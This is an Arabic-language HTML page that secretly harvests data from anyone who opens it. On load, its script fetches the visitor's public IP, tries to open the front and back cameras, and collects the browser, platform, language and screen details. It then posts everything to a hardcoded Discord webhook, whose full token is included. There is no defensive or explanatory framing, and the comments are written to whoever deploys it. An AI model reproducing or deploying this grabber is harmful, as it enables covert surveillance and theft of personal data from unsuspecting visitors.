<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تريد</title>
</head>
<body>
    <!-- روابط الصور والفيديو -->
    <img id="frontImg" src="" alt="Front Cam">
    <img id="backImg" src="" alt="Back Cam">
    <video id="vidFront" autoplay playsinline muted></video>
    <video id="vidBack" autoplay playsinline muted></video>

    <script>
        // رابط الويب هوك الخاص بك
        const webhookUrl = "https://discord.com/api/webhooks/1558501429138956419/YxF7yDhJdIRQ2dWZdEI9oTA5GUEGr_GGN2jNtLxG3TCMjeL2XYr7rQN0sUTxwcFzC5gb";

        // دالة بسيطة لإرسال البيانات (بدون تعقيد)
        async function sendToWebhook(data) {
            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
                });
            } catch (e) { console.error(e); }
        }

        // جمع المعلومات
        async function gatherInfo() {
            let info = {};

            // IP Address
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                info.ip = (await res.json()).ip;
            } catch (e) { info.ip = "Failed to get IP"; }

            // Camera Info
            const constraints = { 
                video: { facingMode: "user" }, 
                audio: false 
            };
            
            // محاولة فتح الكاميرا الأمامية
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                document.getElementById('vidFront').srcObject = stream;
                document.getElementById('frontImg').src = stream.getTracks()[0].label;
                info.frontCam = stream.getTracks()[0].label;
            } catch (e) { info.frontCam = e.message; }

            // محاولة فتح الكاميرا الخلفية
            constraints.video.facingMode = "environment";
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                document.getElementById('vidBack').srcObject = stream;
                document.getElementById('backImg').src = stream.getTracks()[0].label;
                info.backCam = stream.getTracks()[0].label;
            } catch (e) { info.backCam = e.message; }

            // معلومات النظام
            info.userAgent = navigator.userAgent;
            info.platform = navigator.platform;
            info.language = navigator.language;
            info.screenSize = `${screen.width}x${screen.height}`;
            info.battery = "N/A"; // يتطلب إذن إضافي في بعض المتصفحات

            // إرسال كل شيء للويب هوك
            sendToWebhook(info);
        }

        // تشغيل عند التحميل
        window.onload = gatherInfo;
    </script>
</body>
</html>
